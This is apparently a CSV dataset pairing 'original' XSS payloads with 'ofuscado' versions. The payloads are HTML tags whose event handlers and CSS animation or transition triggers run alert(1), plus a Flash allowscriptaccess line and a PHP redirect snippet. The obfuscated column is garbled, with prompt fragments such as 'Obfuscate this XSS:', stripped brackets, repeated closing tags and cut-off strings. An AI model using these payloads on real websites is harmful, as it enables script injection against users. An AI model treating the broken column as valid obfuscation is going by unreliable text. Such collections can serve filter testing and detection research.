original,ofuscado
"<iframe onmouseenter=""alert(1)"">test</iframe>",": iframe onmouseenter=""alert(1)"">test/iframe>"
"<listing onkeydown=""alert(1)"" contenteditable>test</listing>","! listing onkeydown=""alert(1)"" contenteditable>test/listing>"
<svg><ol onload=alert(1)></ol>,XSS: svg>ol onload=alert(1)>/ol>
"<base onmouseover=""alert(1)"">test</base>","Objektive XSS: base onmouseover=""alert(1)"">test/base>"
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",":style>@keyframes x/style>plaintext style=""animation-name:x"" onanimationend=""alert(1)"">/plaintext>/plaintext> ."
"<keygen onmouseleave=""alert(1)"">test</keygen>","this XSS: keygen onmouseleave=""alert(1)"">test/keygen>"
<hr id=x tabindex=1 onactivate=alert(1)></hr>,: hr id=x tabindex=1 onactivate=alert(1)>/hr>
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>","/embed id=x style=""transition:color 1s"" ontransitionend=alert(1)>/embed>"
<bdo onpointerdown=alert(1)>xss</bdo>,this XSS: bdo onpointerdown=alert(1)>xss/bdo>
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>","saable>test blockquote onbeforepaste=""alert(1)"" contenteditable>test/blockquote>"
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,/command>input autofocus>
"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>","the XSS: fieldset oncopy=""alert(1)"" contenteditable>test/fieldset>."
<basefont onpointerup=alert(1)>xss</basefont>,XSS: basefont onpointerup=alert(1)>xss/basefont>
"<form ondblclick=""alert(1)"">test</form>",>test/form>.
<image srcset=1 onerror=alert(1)>,"al(1)>:=""image""1 onerror=alert(1)>..."
<address id=x tabindex=1 onactivate=alert(1)></address>,this XSS: address id=x tabindex=1 onactivate=alert(1)>/address>
<tr onpointerup=alert(1)>xss</tr>,XSS: tr onpointerup=alert(1)>xss/tr>> = /tr> =/tr>>
<header id=x tabindex=1 onfocus=alert(1)></header>,header id=x tabindex=1 onfocus=alert(1)>/header>
"<track onmouseleave=""alert(1)"">test</track>","o: track onmouseleave=""alert(1)"">test/track>"
"src=""http://ha.ckers.org/.swf"" allowscriptaccess=""always""","XSS, letscriptaccess=""always"" allowscriptaccess=""always"" allowscriptaccess=""always"""
"<content onmouseleave=""alert(1)"">test</content>",": content onmouseleave=""alert(1)"">test/content>"
"<fieldset onmouseover=""alert(1)"">test</fieldset>",": fieldset onmouseover=""alert(1)"">test/fieldset>"
<tfoot onpointerup=alert(1)>xss</tfoot>,: tfoot onpointerup=alert(1)>xss/tfoot>
"<figcaption oncut=""alert(1)"" contenteditable>test</figcaption>",":, tot un=""alert(1)"" contenteditable>test/figcaption>"
"<span draggable=""true"" ondragend=""alert(1)"">test</span>",">test/span>: span draggable=""true"" ondragend=""alert(1)"">test/span>"
"<applet oncut=""alert(1)"" contenteditable>test</applet>",": applet oncut=""alert(1)"" contenteditable>test/applet>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>","s style>@keyframes xfromleft:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>q id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/q>/q>/q>/q>/q>/q>/q>/q>"
"d=""alert('');\"")"";","Obfuscate this XSS: d=""alert('');"")"";"
"<li onmouseup=""alert(1)"">test</li>",": li onmouseup=""alert(1)"">test/li>"
"<button onmousedown=""alert(1)"">test</button>",cgbcl>test/button>>test/button>
"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",/var>
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,/article>Input autofocus>
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>","style>@keyframes xfromleft:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/frameset>frameset>frameset id=x style=""position:absolute;"" onanimationcancel=""aler"
<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,: param id=x tabindex=1 ondeactivate=alert(1)>/param>input id=y autofocus>
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,: th id=x tabindex=1 onbeforeactivate=alert(1)>/th>
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,data onfocusout=alert(1) tabindex=1 id=x>/data>input autofocus>
"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>","=""true"" ondragleave=""alert(1)"">test/mark>"
"<em onbeforepaste=""alert(1)"" contenteditable>test</em>","XSS: em onbeforepaste=""alert(1)"" contenteditable>test/em>"
"<menu onkeyup=""alert(1)"" contenteditable>test</menu>","XSS: menu onkeyup=""alert(1)"" contenteditable>test/menu>"
"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",": wbr oncut=""alert(1)"" contenteditable>test/wbr>"
<style id=x tabindex=1 onactivate=alert(1)></style>,style id=x tabindex=1 onactivate=alert(1)>/style>
"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></u>","s=""transition:color 10s"" ontransitioncancel=alert(1)>/u>"
"<section onmouseover=""alert(1)"">test</section>",": section onmouseover=""alert(1)"">test/section>"
"<title onmouseout=""alert(1)"">test</title>",": title onmouseout=""alert(1)"">test/title>"
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,isolfuscate this XSS:tfoot id=x tabindex=1 onfocus=alert(1)>/tfoot>
<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>,details onblur=alert(1) tabindex=1 id=x>/details>input autofocus>.
"<acronym onmousemove=""alert(1)"">test</acronym>","/acronym> to reorder the XSS: acronym onmousemove=""alert(1)"">test/acronym>"
<input onpointermove=alert(1)>xss</input>,XSS: input onpointermove=alert(1)>xss/input>
header('location: '.$_get['param']);,Obscate this XSS: header('location: '.$_get['param']);
"<slot oncontextmenu=""alert(1)"">test</slot>",:/slot>test/slot>test/slot> test/slot> test/slot> test.
"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",": video draggable=""true"" ondragleave=""alert(1)"">test/video>"
<div onpointerleave=alert(1)>xss</div>,div onpointerleave=alert(1)>xss/div>
<svg><spacer onload=alert(1)></spacer>,the XSS: svg>spacer onload=alert(1)>/spacer>
"<nav oncopy=""alert(1)"" contenteditable>test</nav>",": nav oncopy=""alert(1)"" contenteditable>test/nav>"
<applet onreadystatechange=alert(1)></applet>,: applet onreadystatechange=alert(1)>/applet>
"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>","1"" contenteditable>test /strike>>test/strike>."
"<style>:target {transform: rotate(180deg);}</style><address id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></address>","id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/address>"
<body onpointerover=alert(1)>xss</body>,this XSS: body onpointerover=alert(1)>xss/body>
<track id=x tabindex=1 onfocusin=alert(1)></track>,: track id=x tabindex=1 onfocusin=alert(1)>/track>
"<div onmouseleave=""alert(1)"">test</div>","Obfuscate this XSS: div onmouseleave=""alert(1)"">test/div>"
"<li onmousedown=""alert(1)"">test</li>",": li onmousedown=""alert(1)"">test/li>"
<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>,/menu>input id=y autofocus>
<element onpointerenter=alert(1)>xss</element>,": element onpointerenter=alert(1)>xss/element>, element>/element> for XSS:element onpointerenter=alert(1)>xss/element>"
<footer id=x tabindex=1 onactivate=alert(1)></footer>,()>/footer>>
"<thead draggable=""true"" ondragend=""alert(1)"">test</thead>","that this IS IS an XSS: thead draggable=""true"" ondragend=""alert(1)"">test/thead>"
"<source draggable=""true"" ondragend=""alert(1)"">test</source>","XSS: source draggable=""true"" ondragend=""alert(1)"">test/source>"
<section id=x tabindex=1 onfocusin=alert(1)></section>,XSS: section id=x tabindex=1 onfocusin=alert(1)>/section>
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",": style>@keyframes x/style>shadow style=""animation-name:x"" onanimationstart=""alert(1)"">/shadow>/shadow>/shadow>/shadow>(shadow>/shadow>/shadow>shadow style=""animation-name:x"" onanimationstart=""alert(1)"">/shadow>/shadow>/shadow>/shadow>/shadow>/shadow>/shadow>"
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",": bdi onkeyup=""alert(1)"" contenteditable>test/bdi>"
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",", acronym onpaste=""alert(1)"" contenteditable>test/acronym>"
"<style>:target {transform: rotate(180deg);}</style><canvas id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></canvas>","/style>canvas id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/canvas>"
"<details onkeydown=""alert(1)"" contenteditable>test</details>","rt(1)"" contenteditable>test/details>>test/details> XSS: details onkeydown=""alert(1)"" contenteditable>test/details>test/details>"
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,/slot>input id=y autofocus>.
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,=y autofocus>.
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",/div>output ondragover=alert(1) contenteditable>drop here/output>
"<font oncontextmenu=""alert(1)"">test</font>","XSS: font oncontextmenu=""alert(1)"">test/font>"
<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>,t toss these XSS: i id=x tabindex=1 ondeactivate=alert(1)>/i>input id=y autofocus>
"<table draggable=""true"" ondragenter=""alert(1)"">test</table>","table draggable=""true"" ondragenter=""alert(1)"">test/table>"
"<big onmouseenter=""alert(1)"">test</big>","to XSS: big onmouseenter=""alert(1)"">test/big>"
